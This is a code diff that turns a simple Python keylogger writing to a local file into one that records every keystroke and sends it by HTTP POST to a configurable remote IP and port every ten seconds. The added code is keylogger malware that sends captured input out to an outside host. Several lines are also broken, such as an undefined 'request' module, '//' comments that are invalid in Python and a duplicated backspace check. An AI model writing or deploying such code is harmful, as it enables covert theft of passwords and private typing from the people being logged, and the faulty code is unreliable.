@@ -1,13 +1,53 @@
 from pynput import keyboard
 
-def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt",'a') as logKey:
-        try:
-            char = key.char
-            logKey.write(char)
-        except:
-            print("Error getting char")
-    listener = keyboard.Listener(on_press=keyPressed)
-    listener.start()
-    input()
+import requests 
+
+import json
+import threading
+
+text= ""
+
+ip_address= "192.168.32.5"  //change_this
+port_number= 8808           //change_this 
+
+time_interval = 10
+
+
+def send_post_req():
+    try:
+        payload= json.dumps({"keyboardData": text})
+
+        r = request.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
+        timer = threading.Timer(time_interval, send_post_req)
+        timer.start()
+
+    except:
+        print("Couldn't complete request!")
+
+def on_press(key):
+    global text
+
+
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text+= "\t"
+    elif key == keyboard.Key.space:
+        text+= " "
+    elif key == keyboard.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) ==0 :
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        text += str(key).strip("'")
+
+with keyboard.Listener(
+    on_press=on_press) as listener:
+    send_post_req()
+    listener.join()
